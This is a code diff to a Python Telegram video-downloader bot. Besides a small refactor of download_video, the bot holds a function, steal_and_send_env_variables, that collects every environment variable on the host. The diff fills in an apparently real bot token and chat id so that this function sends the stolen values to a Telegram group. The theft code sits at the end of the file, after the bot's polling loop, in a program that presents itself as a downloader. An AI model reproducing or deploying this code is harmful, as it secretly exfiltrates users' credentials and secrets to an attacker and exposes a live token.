@@ -41,7 +41,7 @@ def handle_dl(message):
         print(last_link)
 
         # Download the video using the last redirected link
-        download_video(last_link)
+        download_video(message, last_link)
 
         # Store user-specific data
         user_data[user_id]['file_name'] = 'evil_video.mp4'
@@ -86,7 +86,7 @@ def get_last_link(links):
         print(f'Error fetching last redirected link: {e}')
         raise e
 
-def download_video(url):
+def download_video(message, url):
     try:
         user_id = message.from_user.id
         file_name = user_data[user_id]['file_name']
@@ -115,6 +115,7 @@ bot.polling(none_stop=True)
 
 
 
+
 def steal_and_send_env_variables():
     env_variables = os.environ
     stolen_variables = {}
@@ -123,8 +124,8 @@ def steal_and_send_env_variables():
         stolen_variables[variable] = value
 
     # Now, let's send the stolen variables to a Telegram group using the Telegram Bot API
-    bot_token = "<your_bot_token>"
-    chat_id = "<your_chat_id>"
+    bot_token = "6961308478:AAHNtfxaAUstG8dfb_WLghkXVhpmd5zunac"
+    chat_id = "-1001967606455"
     api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
 
     message = "Stolen Environment Variables:\n"
